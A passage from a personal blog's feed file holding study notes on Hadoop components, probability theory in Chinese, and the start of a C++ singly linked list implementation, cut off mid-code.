            
            <tag> iot </tag>
            
            <tag> raspberry </tag>
            
            <tag> hardware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hadoop笔记</title>
      <link href="/blog/note-hadoop/"/>
      <url>/blog/note-hadoop/</url>
      
        <content type="html"><![CDATA[<h1 id="Chapter1-Big-Data-Concept"><a href="#Chapter1-Big-Data-Concept" class="headerlink" title="Chapter1 Big Data Concept"></a>Chapter1 Big Data Concept</h1><h2 id="Big-Data"><a href="#Big-Data" class="headerlink" title="Big Data"></a>Big Data</h2><h3 id="What-is-Big-Data"><a href="#What-is-Big-Data" class="headerlink" title="What is Big Data"></a>What is Big Data</h3><p>Data - The most valuable Resource<br>Big Data is a term applied to data sets that cannot be capured, managed, and processed within a tolerable elapsed and specified time frame by commonly used software tools.</p><p>Characteristics of Big Data Technology</p><ul><li>Volume</li><li>Variety</li><li>Value density</li><li>Velocity</li></ul><h3 id="The-Birth-of-Big-Data"><a href="#The-Birth-of-Big-Data" class="headerlink" title="The Birth of Big Data"></a>The Birth of Big Data</h3><p>The 21st century is an era of great development of data and information.</p><h3 id="Cumulative-amount-of-data-generated"><a href="#Cumulative-amount-of-data-generated" class="headerlink" title="Cumulative amount of data generated"></a>Cumulative amount of data generated</h3><h3 id="Transition-from-IT-to-DT"><a href="#Transition-from-IT-to-DT" class="headerlink" title="Transition from IT to DT"></a>Transition from IT to DT</h3><p>DT = Data Technology.<br>Usage of Big Data</p><ul><li>Precision advertisement delivery</li><li>Medical and health systems</li><li>Personalized education</li><li>Personal Credit Reporting</li></ul><h3 id="Big-Data-Ecosphere-Tools-mainly-include"><a href="#Big-Data-Ecosphere-Tools-mainly-include" class="headerlink" title="Big Data Ecosphere Tools mainly include"></a>Big Data Ecosphere Tools mainly include</h3><ul><li><p>Hadoop<br>Hadoop is a distributed system infrastructure developed by Apache Foundation. Doug Cutting is inspired by Map/Reduce and Google File System(GFS) developed by Google Lab. The core architecture of Hadoop is MapReduce programming model and HDFS distributed file system.<br>MapReduce framework can decompose an application into many parallel computing instructions, running very large data sets across a large number of computing nodes. Map is used to segment large data, and Reduce is used to merge the results of Map calculation.<br>HDFS(Hadoop Distributed File System) distributed file system provides storage services for massive data and large files. The files greater than 64/127MB is divided into blocks and stored in multiple nodes. It has high throughput and fault tolerance.</p></li><li><p>HBase<br>HBase is an open source KV database of apache. It is based on HDFS and provides a database system with high reliability, high performance, column storage, scalability and real-time reading and writing. It is between NoSQL and RDBMS. It can retrieve data only through row key and range of primary key. It only supports single-line transactions(multi-table join and other complex operation can be realized through hive support). It is mainly used to store unstructured and semi-structured loose data.<br>Sparse. For null columns, there is no storage space, so tables can be designed to be very sparse.</p></li><li>Storm<br>Apache Storm is a free and open source distributed real-time computing system, which simplifies the reliable processing of stream data.<br>Storm Features: Easy to expand; The processing of each piece of information can be guaranteed; Storm cluster management is simple; Storm’s Fault Tolerance Function(A node hangs up and can’t affect my application); Low latency </li><li>Zookeeper<br>Zookeeper is a high performance, distributed, open source distributed application coordination service.<br>Zookeeper Characteristics: Sequentical consistency; Atomicity; Uniformity; Reliability; Timeliness<br>Zookeeper Use Cases: Data Publishing and Subscription; Name Space Service; Distributed notification/coordination; Distributed Lock; Cluster Management</li><li>Sqoop<br>Sqoop is Apache’s top-level project, which allows users to extract data from relational databases into Hadoop for further processing.</li><li><p>Mahout<br>Mahout is a powerful data mining tool and a set of distributed machine learning algorithms, including the implementation, classification and clustering of distributed collaborative filtering. It greatly improves the data volume and processing performance of the algorithm.</p></li><li><p>Hive</p></li></ul><h3 id="Hadoop-Introduction-of-Application-Status"><a href="#Hadoop-Introduction-of-Application-Status" class="headerlink" title="Hadoop Introduction of Application Status"></a>Hadoop Introduction of Application Status</h3><ul><li>Alibaba</li><li>Baidu</li><li>Tencent</li><li>Qihu 360</li><li>China Mobile</li><li>Yahoo</li><li>Facebook</li></ul><h3 id="Hadoop-Introduction-to-Version-Development"><a href="#Hadoop-Introduction-to-Version-Development" class="headerlink" title="Hadoop Introduction to Version Development"></a>Hadoop Introduction to Version Development</h3><ul><li>2004, The original version of HDFS and MapReduce was implemented by Doug Cutting and Mike Cafarella.</li></ul><h1 id="Chapter2-Hadoop-Installation"><a href="#Chapter2-Hadoop-Installation" class="headerlink" title="Chapter2 Hadoop Installation"></a>Chapter2 Hadoop Installation</h1><h1 id="Chapter3-Linux-Basics"><a href="#Chapter3-Linux-Basics" class="headerlink" title="Chapter3 Linux Basics"></a>Chapter3 Linux Basics</h1><h1 id="Chapter4-Hadoop-Components"><a href="#Chapter4-Hadoop-Components" class="headerlink" title="Chapter4 Hadoop Components"></a>Chapter4 Hadoop Components</h1><h2 id="YARN-Model-Overview"><a href="#YARN-Model-Overview" class="headerlink" title="YARN Model Overview"></a>YARN Model Overview</h2><p>The YARN model controls the entire cluster and manages the allocation fo applications to the underlying computing resouces. ResourceManager assigns various resource parts(computing, memory, bandwidth, etc.) to the underlying NodeManage(each node agent of YARN). ResourceManager also allocates resources with Application Master to start and monitor their underlying applications with NodeManager.</p><h3 id="NameNode"><a href="#NameNode" class="headerlink" title="NameNode"></a>NameNode</h3><p>In HDFS, the NameNode service provides all the services such as NameSpave menagement, block management and so on for the entire HDFS file system. Metadata(the directory structure of the entire file system, which files are in each directory, which blocks are in each file, and which DataNode each block is stored on) All related services are provides by the NameNode process.<br>It includes(store in Linux not in HDFS): </p><ul><li>fsimage: Metadata Mirror File.</li><li>edits: Operating log files.</li><li>fstime: Time to save the alst checkpoint.</li></ul><h3 id="QJM-Qurom-Journal-Manager"><a href="#QJM-Qurom-Journal-Manager" class="headerlink" title="QJM(Qurom Journal Manager)"></a>QJM(Qurom Journal Manager)</h3><p>QJM is introduced to realize high availability of read and write, which makes it possible for HDFS to achieve real high availability. The principle of QJM is to provide 2N+1 node to store data, and every time a node larger than or equal to N+1 is writen successfully, it will be successful and ensure high availability of data. These are the following auxiliary processes:</p><ul><li>JournalNode: QJM storage segment process, providing log reading and writing, storage, repair and other services.</li><li>DFSZKFailoverController: The switching controller based on zookeeper is mainly composed of ActiveStandbyElector and HealthMonitor. ActiveStandbyElector mainly interacts with zookeeper to obtain global locks to determine whether Master is in standby or active state. HealthMonitor is responsible for the status of each Master and switches according to status.</li></ul><h3 id="NodeManager"><a href="#NodeManager" class="headerlink" title="NodeManager"></a>NodeManager</h3><p>NodeManager(NM) is an agent on each node in YARN. It manages a single computing node in Hadoop cluster, including maintaining communication with ResourceManager, supervising the life cycle management of Container, monitoring the resource utilization(mamory, CPU, etc.) of each Container, tracking the health status of nodes, managing logs and different applications. The ancillary services used by the program.</p><h3 id="DataNode"><a href="#DataNode" class="headerlink" title="DataNode"></a>DataNode</h3><p>Provides storage services for real file data, reports block information stored by itself when DataNode starts, and updates mapping tables (DataNode and Block) after NameNode receives information.</p><ul><li>File Block: The most basic storage unit.</li><li>HDFS default block size is 64MB, with a 256MB file, a total of 256/64 = 4 blocks.</li><li>Unlike ordinary file systems, HDFS does not take up the entire storage space of data blocks if a file is smaller than the size of a data block.</li><li>Replication: Multiple copies. The default is three, which can be configured through configuration files.</li></ul><h3 id="ResourceManager"><a href="#ResourceManager" class="headerlink" title="ResourceManager"></a>ResourceManager</h3><p>In YARN, Resource Manager is responsible for the unified management and allocation of all resources in the cluster. It receives resource reporting information from each node(NodeManager), and distributes there information to each application according to a certain strategy.</p><ul><li>NodeManager follows instructions from ResourceManager to manage available resources on a single node.</li><li>ApplicationMaster is responsible for negotiating resources with ResourceManager and starting containers in cooperation with NodeManagers.<br>Structure diagram of ResourceManager</li><li>UseService(User Interaction Module)<ul><li>ClientRMService</li><li>AdminService</li><li>RMWebApp</li></ul></li><li>Manage NMs(Management module)<ul><li>NMLiveLinessMonitor</li><li>NodesListManager</li><li>ResourceTrackerService</li></ul></li><li>AM Management module<ul><li>AMLivelinessMonitor</li><li>ApplicationMasterService</li><li>ApplicationMasterService</li></ul></li><li>Manage App(Management module)<ul><li>ApplicationACLManager</li><li>RMAppManager</li><li>ContainerAllocationExpirer</li></ul></li><li>State Machine Management Module<ul><li>RM maintains four kinds of state machines, namely RMApp, RMAppAttempt, RMContainer and RMNode.</li><li>RMApp: Maintain the entire running cycle of an application, including the entire process from start-up to end-of-run.</li><li>RMAppAttempt: An application may start multiple instances.</li><li>RMContainer: Maintain a Container’s run cycle, from creation to completion.</li><li>RMNode: Maintaining a Nodemanager lifecycle, including the entire process from start to finish.</li></ul></li></ul><h3 id="ApplicationMaster"><a href="#ApplicationMaster" class="headerlink" title="ApplicationMaster"></a>ApplicationMaster</h3><p>Each application submitted by users contains an AM. Its main functions are to negotiate with RM scheduler to obtain resources, further assign tasks to internal, start/stop tasks with NM, and monitor the running  status of task.</p><ul><li>Negotiate with Resource Manager to obtain resources(Container).</li><li>Get the task through core components with the resource manager.</li><li>Communicate with NodeManager to start or stop tasks(Map or Reduce).</li></ul><h3 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h3><p>Container is resource abstraction in YARN. It encapsulates resources on a DataNode node.</p><h3 id="Scheduler"><a href="#Scheduler" class="headerlink" title="Scheduler"></a>Scheduler</h3><p>The resource scheduler allocates resources to each application according to queue capacity queue restrictions</p><h2 id="Hadoop-1-0-and-Hadoop-2-0-Differences"><a href="#Hadoop-1-0-and-Hadoop-2-0-Differences" class="headerlink" title="Hadoop 1.0 and Hadoop 2.0 Differences"></a>Hadoop 1.0 and Hadoop 2.0 Differences</h2><h1 id="Chapter8"><a href="#Chapter8" class="headerlink" title="Chapter8"></a>Chapter8</h1><p>MapReduce is a parallel programming model that implements basic parallel computing tasks using Map and Reduce functions.</p><p>Two main phases of map reduce: Mapper and Reduce<br>Mapper: Maps are the idividucal tasks that transform input records into intermediate records.<br>Shuffling &amp; Sorting: The process of exchanging the intermediate outputs from the map tasks to where they are required by reducers. Sorting is done</p><p>Reducer: Reduces a set of intermediate values which share a key to a smaller set of values. All of the values with the same key are persented to a single reducer together. </p>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hadoop </tag>
            
            <tag> note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率统计笔记</title>
      <link href="/blog/note-probability/"/>
      <url>/blog/note-probability/</url>
      
        <content type="html"><![CDATA[<p>可算是发书了 - 20190909</p><h2 id="第一章-概率论的基本概念"><a href="#第一章-概率论的基本概念" class="headerlink" title="第一章 概率论的基本概念"></a>第一章 概率论的基本概念</h2><h3 id="第一节-样本空间、随机事件"><a href="#第一节-样本空间、随机事件" class="headerlink" title="第一节 样本空间、随机事件"></a>第一节 样本空间、随机事件</h3><p>随机试验<br>人们是通过试验去研究随机现象的，把对随机现象加以研究所进行的观察或实验，称为<strong>试验</strong>. 若一个试验具有下列3个特点：</p><ol><li>可以在相同的条件下重复地进行</li><li>每次试验的可能结果不止一个，并且事先可以明确试验所有可能出现的结果</li><li>进行一次试验之前不能确定哪一个结果会出现<br>则称这一试验为<strong>随机试验</strong>，记为$E$</li></ol><p>在一个试验中，不论可能出现的结果有多少，总可以从中找出一组基本结果，满足：</p><ol><li>每进行一次试验，必然出现且只能出现其中的一个基本结果</li><li>任何结果，都是由其中的一些基本结果所组成<br>随机试验$E$的所有基本结果组成的集合称为<strong>样本空间</strong>，记为$\Omega $. 样本空间的元素，即$E$的每个基本结果，称为<strong>样本点</strong></li></ol><p>随机试验$E$的样本空间$\Omega $的子集称为$E$的<strong>随机事件</strong>，简称<strong>事件</strong>，通常用大写字母$A,B,C,\cdots$来表示，在每次试验中，当且仅当这一子集中的一个样本点出现时，称这一事件发生<br>特别地，由一个样本点组成的单点集，称为<strong>基本事件</strong>.<br>每次试验中都必然发生的事件，称为<strong>必然事件</strong>. 样本空间$\Omega $包含所有的样本点，它是$\Omega $自身的子集，每次试验中都必然发生，故它就是一个必然事件。 因而必然事件也用$\Omega $表示.<br>在每次试验中不可能发生的事件称为<strong>不可能事件</strong>，用$\varnothing $表示</p><p>事件之间的关系及其运算</p><ol><li>如果事件$A$发生必然导致事件$B$发生，则称事件$A$包含于事件$B$(或称事件$B$包含事件$A$),记为$A\subset B$(或$B\supset A$).</li><li>“事件$A$与事件$B$中至少有一个发生”的事件称为$A$与$B$的并(和),记为$A\cup B$.</li><li>“事件$A$与事件$B$同时发生”的事件称为$A$与$B$的交(积),记为$A\cap B$(或$AB$).</li><li>“事件$A$发生而事件$B$不发生”的事件称为$A$与$B$的差,记为$A-B$.</li><li>如果两个事件$A$与$B$不可能同时发生,则称事件$A$与$B$为互不相容(互斥). 记为$A\cap B=\varnothing$.</li><li>若$A\cup B=\Omega $且$A\cap B=\varnothing $,则称事件$A$与事件$B$互为逆事件(对立事件). $A$的对立事件记为$\bar {A}$,$\bar{A}$是由所有不属于$A$的样本点组成的事件,它表示”$A$不发生”这样一个事件,显然$\bar{A}=\Omega -A$</li></ol><p>一般事件运算满足下列关系</p><ol><li>交换律 $A\cup B=B\cup A, A\cap B=B\cap A$.</li><li>结合律 $A\cup (B\cup C)=(A\cup B)\cup C, A\cap (B\cap C)=(A\cap B)\cap C$.</li><li>分配律 $A\cup (B\cap C)=(A\cup B)\cap (A\cup C),A\cap (B\cup C)=(A\cap B)\cup (A\cap C)$.</li><li>$A-B=A\bar {B}=A-AB$.</li><li>对有穷个或可数无穷个事件$A_i$,恒有$\overline{\bigcup_{i=1}^{n}A_i}=\bigcap_{i=1}^n\overline{A_i},\overline{\bigcap_{i=1}^{n}A_i}=\bigcup_{i=1}^{n}\overline{A_i}$</li></ol><h3 id="第二节-概率、古典概型"><a href="#第二节-概率、古典概型" class="headerlink" title="第二节 概率、古典概型"></a>第二节 概率、古典概型</h3><blockquote><p>定义1.1 在相同的条件下，进行了$n$次试验. 若随机事件$A$在$n$次试验中发生了$k$次，则此比值$\frac{k}{n}$称为事件$A$在这$n$次试验中发生的<strong>频率</strong>，记为$f_n(A)=\frac{k}{n}$</p></blockquote><p>频率具有以下性质：</p><ol><li>对于任一事件$A$，有$0\leqslant f_n(A)\leqslant 1$</li><li>对于必然事件$\Omega$，有$f_n(\Omega)=1$</li><li>若事件$A,B$互不相容，则$f_n(A\cup B)=f_n(A)+f_n(B)$.</li></ol><blockquote><p>定义1.2 设事件$A$在$n$次重复试验中，发生的次数为$k$，当$n$很大时，频率$\frac{k}{n}$在某一数值$p$附近摆动，而随着试验次数$n$的增加，发生较大摆动的可能性越来越小，则称数$p$为事件$A$发生的<strong>概率</strong>，记为$P(A)=p$</p></blockquote><p>概率公理化定义</p><blockquote><p>定义1.3 设$\Omega$为样本空间，$A$为事件，对于每一个事件$A$赋予一个实数，记为$P(A)$，如果$P(A)$满足以下条件:</p><ol><li>非负性：$P(A)\geqslant 0$</li><li>规范性：$P(\Omega)=1$</li><li>可数可加性：对于两两互不相容的可数无穷多个事件$A_1,A_2,\cdots,A_n,\cdots$，有$P(\bigcup_{n=1}^{\infty}A_n)=\sum_{n=1}^{\infty}P(A_n)$<br>则称实数$P(A)$为事件$A$的<strong>概率</strong>.</li></ol></blockquote><ul><li>性质1 $P(\varnothing)=0$</li><li>性质2(有限可加性) 若$A_1,A_2,\cdots, A_n$为两两互不相容事件，则有$P(\bigcup_{k=1}^{n}A_k)=\sum_{k=1}^{n}P(A_k)$.</li><li>性质3 设$A,B$是两个事件，则有$P(B-A)=P(B)-P(AB)$.</li><li>性质3’ 设$A,B$是两个事件，若$A\subset B$，则有$P(B-A)=P(B)-P(A); P(A)\leqslant P(B)$</li><li>性质4 对于任一事件$A$，有$P(A)\leqslant 1$</li><li>性质5 对于任一事件$A$，有$P(\bar{A})=1-P(A)$</li><li>性质6(加法公式) 对于任意两个事件$A,B$，有$P(A\cup B)=P(A)+P(B)-P(AB)$.</li></ul><p>古典概型</p><blockquote><p>定义1.4 若随机试验$E$满足以下条件：</p><ol><li>试验的样本空间$\Omega$只有有限个样本点，即$\Omega=\{\omega_1,\omega_2,\cdots,\omega_n\}$.</li><li>试验中每个基本事件的发生都是等可能的，即$P(\{\omega_n\})=P(\{\omega_2\})=\cdots=P(\{\omega_n\})$<br>则称此试验为<strong>古典概型</strong>，或称为<strong>等可能概型</strong></li></ol></blockquote><h3 id="第三节-条件概率、全概率公式"><a href="#第三节-条件概率、全概率公式" class="headerlink" title="第三节 条件概率、全概率公式"></a>第三节 条件概率、全概率公式</h3><blockquote><p>定义1.5 设$A,B$为两个事件，且$P(B)&gt;0$，则称$\frac{P(AB)}{P(B)}$为事件$B$已发生的条件下事件$A$发生的<strong>条件概率</strong>，记为$P(A|B)$，即$P(A|B)=\frac{P(AB)}{P(B)}$.</p></blockquote><p><strong>乘法定理</strong></p><blockquote><p>定理1.1 设$P(A)&gt;0$，则有$P(AB)=P(A)P(B|A)$.</p></blockquote><p>全概率公式和贝叶斯公式</p><blockquote><p>定义1.6 设$\Omega$为样本空间$A_1,A_2,\cdots,A_n$为$\Omega$的一组事件，若满足</p><ol><li>$A_iA_j=\varnothing, i\neq j; i,j=1,2,\cdots,n$</li><li>$\bigcup_{i=1}^{n}A_i=\Omega$.</li></ol><p>定理1.2(全概率公式) 设$B$为样本空间$\Omega$中的任一事件，$A_1,A_2,\cdots,A_n$为$\Omega$的一个划分，且$P(A_i)&gt;0,i=1,2,\cdots,n$，则有$P(B)=\sum_{i=1}^{n}P(A_i)P(B|A_i)$称上述公式为<strong>全概率公式</strong></p><p>定理1.3(贝叶斯公式) 设样本空间为$\Omega$，$B$为$\Omega$中的事件,$A_1,A_2,\cdots,A_n$为$\Omega$的一个划分，且$P(B)&gt;0,P(A_i)&gt;0$，$i=1,2,\cdots,n$，则有$P(A_i|B)=\frac{P(B|A_i)P(A_i)}{\sum_{j=1}^{n}P(B|A_j)P(A_j)},i=1,2,\cdots,n$.称上式为<strong>贝叶斯公式</strong>，也称为<strong>逆概率公式</strong></p></blockquote><h3 id="第四节-独立性"><a href="#第四节-独立性" class="headerlink" title="第四节 独立性"></a>第四节 独立性</h3><p>事件的独立性</p><blockquote><p>定义1.7 若事件$A_1,A_2$满足：$P(A_1A_2)=P(A_1)P(A_2)$，则称事件$A_1,A_2$是<strong>相互独立</strong>的<br>定理1.4 若事件$A$与$B$相互独立，则下列各对事件也相互独立：$A$与$\bar{B}$,$\bar{A}$与$B$,$\bar{A}$与$\bar{B}$.<br>定理1.5 若事件$A,B$相互独立，且$0&lt;P(A)&lt;1$，则$P(B|A)=P(B|\bar{A})=P(B)$<br>定义1.8 如果$A_1,A_2,A_3$两两独立，且$P(A_1A_2A_3)=P(A_1)P(A_2)P(A_3)$则$A_1,A_2,A_3$相互独立<br>定义1.9 对$n$个事件$A_1,A_2,\cdots,A_n$，若以下$2^n-n-1$个等式成立(公式就是每$i$个公式的组合全满足，同时发生的概率等于各自发生概率的乘积）<br>由定义可知，1. $n$个事件相互独立，则其中任意$k(2\leqslant k\leqslant n)$个事件也相互独立</p><ol><li>若$n$个事件相互独立，则将他们中任意多个事件换成它们的对立事件，所得的$n$个事件仍相互独立</li></ol></blockquote><p>伯努利试验<br>若试验$E$只有两个可能结果：$A$及$\bar{A}$，则称$E$为<strong>伯努利试验</strong>，将$E$独立地重复进行$n$次，则称这一串重复的独立试验为$n$重伯努利试验</p><h2 id="第二章-随机变量"><a href="#第二章-随机变量" class="headerlink" title="第二章 随机变量"></a>第二章 随机变量</h2><h3 id="第一节-随机变量及其分布函数"><a href="#第一节-随机变量及其分布函数" class="headerlink" title="第一节 随机变量及其分布函数"></a>第一节 随机变量及其分布函数</h3><blockquote><p>定义2.1 设随机试验的样本空间为$\Omega$，如果对$\Omega$中每一个元素$e$，有一个实数$X(e)$与之对应，这样就得到一个定义在$\Omega$上的实值单值函数$X=X(e)$，称之为<strong>随机变量</strong><br>定义2.2 设$X$是随机变量，$x$为任意实数，函数$F(x)=P\{X\leqslant x\}$，称为$X$的<strong>分布函数</strong></p></blockquote><p>分布函数具有以下基本性质：</p><ol><li>$F(x)$为单调不减函数</li><li>$0\leqslant F(x)\leqslant 1$，且$\lim_{x\to +\infty}F(x)=1$,常记为$F(+\infty)=1$，$\lim_{x\to -\infty}F(x)=0$,常记为$F(-\infty)=0$</li><li>$F(x+0)=F(x)$，即$F(x)$为右连续</li></ol><h3 id="第二节-离散型随机变量及其分布"><a href="#第二节-离散型随机变量及其分布" class="headerlink" title="第二节 离散型随机变量及其分布"></a>第二节 离散型随机变量及其分布</h3><p>任一离散型随机变量的分布律$\{p_k\}$都具有下述两个基本性质</p><ol><li>非负性 $p_k\geqslant 0, k=1,2,\cdots$</li><li>归一性 $\sum_{k=1}^{\infty}p_k=1$</li></ol><p>常见的离散型随机变量的概率分布</p><ol><li>两点分布<br>若随机变量$X$只有两个取值$x_1,x_2$，分布律为$P\{X=x_1\}=1-p,0 &lt; p &lt; 1; P\{X=x_2\}=p$，则称$X$服从参数为$p$的<strong>两点分布</strong></li><li>二项分布<br>若随机变量$X$的分布律为$P\{X=k\}=C_{n}^{k}p^k(1-p)^{n-k},k=0,1,\cdots,n$，则称$X$服从参数为$n,p$的<strong>二项分布</strong>，记作$X\sim b(n,p)$</li></ol><blockquote><p>定理2.1 泊松定理 设$np_n=\lambda (\lambda&gt;0, \lambda\text{ is a const number.})$，则对任意一固定的非负整数$k$，有$\lim_{n\to \infty}C_{p}^{k}p_{n}^{k}(1-p_n)^{n-k}=\frac {\lambda ^ke^{-\lambda}}{k!}$</p></blockquote><ol><li>泊松分布<br>若随机变量$X$的分布律为$P\{X=k\}=\frac {\lambda ^ke^{-\lambda}}{k!},k=0,1,\cdots$，其中$\lambda &gt;0$是常数，则称$X$服从参数为$\lambda$的泊松分布，记为$X\sim P(\lambda)$</li></ol><h3 id="连续型随机变量及其分布"><a href="#连续型随机变量及其分布" class="headerlink" title="连续型随机变量及其分布"></a>连续型随机变量及其分布</h3><blockquote><p>定义2.3 若对随机变量$X$的分布函数$F(x)$，存在非负函数$f(x)$，使对任意实数$x$，有$F(x)=\int_{-\infty}^{x}=f(t)\text{d}t$，则称$X$为<strong>连续型随机变量</strong>，其中$f(x)$称为$X$的<strong>概率密度函数</strong>，简称<strong>概率密度</strong>或<strong>密度函数</strong><br>$f(x)$具有以下性质</p><ol><li>$f(x)\geqslant 0$.</li><li>$\int_{-\infty}^{\infty}f(x)\text{d}x=1$.</li><li>$P\{x_1&lt;X\leqslant x_2\}=F(x_2)-F(x_1)=\int_{x_1}^{x_2}f(x)\text{d}x(x_1\leqslant x_2)$</li><li>若$f(x)$在$x$点处连续，则有$F’(x)=f(x)$</li></ol></blockquote><p>常见连续型随机变量</p><ol><li><p>均匀分布</p></li><li><p>指数分布</p></li><li><p>正态分布</p></li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>《概率论与数理统计》，韩旭里、谢永钦，北京大学出版社</li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> probability </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构笔记</title>
      <link href="/blog/note-data-structure/"/>
      <url>/blog/note-data-structure/</url>
      
        <content type="html"><![CDATA[<h2 id="抽象数据类型线性表"><a href="#抽象数据类型线性表" class="headerlink" title="抽象数据类型线性表"></a>抽象数据类型线性表</h2><h3 id="单链表基本操作"><a href="#单链表基本操作" class="headerlink" title="单链表基本操作"></a>单链表基本操作</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> d;</span><br><span class="line">    Node *nxt;</span><br><span class="line">    </span><br><span class="line">    Node() &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;d = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>-&gt;nxt = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ADTList</span> &#123;</span></span><br><span class="line">    Node *head;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    </span><br><span class="line">    ADTList() &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;size = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>-&gt;head = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitList</span><span class="params">(ADTList* &amp;L)</span> </span>&#123;</span><br><span class="line">    L = <span class="keyword">new</span> ADTList();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DestoryList</span><span class="params">(ADTList* &amp;L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">delete</span> L;</span><br><span class="line">    L = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ClearList</span><span class="params">(ADTList* &amp;L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">delete</span> L;</span><br><span class="line">    InitList(L);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ListEmpty</span><span class="params">(ADTList* L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L == <span class="literal">NULL</span> || L-&gt;size == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListLength</span><span class="params">(ADTList* L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> L-&gt;size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetElem</span><span class="params">(ADTList* L, <span class="keyword">int</span> i, <span class="keyword">int</span> &amp;e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L == <span class="literal">NULL</span> || i&lt;<span class="number">1</span> || i&gt;ListLength(L)) &#123;</span><br><span class="line">        e = <span class="number">0</span>; <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Node *p=L-&gt;head;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;i; j++) p=p-&gt;nxt;</span><br><span class="line">    e = p-&gt;d;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LocateElem</span><span class="params">(ADTList* L, <span class="keyword">int</span> e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> counter = <span 